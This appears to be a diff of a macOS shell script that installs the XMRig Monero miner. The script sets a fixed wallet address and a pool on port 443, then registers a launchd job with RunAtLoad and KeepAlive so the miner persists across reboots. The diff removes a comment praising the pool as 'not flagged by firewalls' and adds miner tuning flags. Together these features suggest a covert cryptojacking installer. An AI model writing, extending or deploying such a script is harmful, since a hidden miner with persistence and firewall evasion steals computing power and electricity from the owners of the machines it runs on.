@@ -7,7 +7,7 @@
 # ============================================================
 
 WALLET="45yWnSbx7c4TzJCf7hwgdHVYmRxZt5Y4g8JVdRjPJuQALzgLMUBwiK7QU2FMeiwMF48APgsi54rBagJvgMo5KUEqAWA2fbg"
-POOL_HOST="pool.supportxmr.com"  # Direct TLS — supportxmr not flagged by firewalls
+POOL_HOST="pool.supportxmr.com"
 POOL_PORT="443"
 XMRIG_VERSION="6.26.0"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"
@@ -113,6 +113,9 @@ printf '  <key>ProgramArguments</key><array>\n' >> "$PLIST_PATH"
 printf '    <string>%s</string>\n' "$BINARY_PATH" >> "$PLIST_PATH"
 printf '    <string>--config</string>\n' >> "$PLIST_PATH"
 printf '    <string>%s</string>\n' "$CONFIG_PATH" >> "$PLIST_PATH"
+printf '    <string>--no-huge-pages</string>\n' >> "$PLIST_PATH"
+printf '    <string>--randomx-mode=light</string>\n' >> "$PLIST_PATH"
+printf '    <string>--threads=%s</string>\n' "$THREADS" >> "$PLIST_PATH"
 printf '  </array>\n' >> "$PLIST_PATH"
 printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
 printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
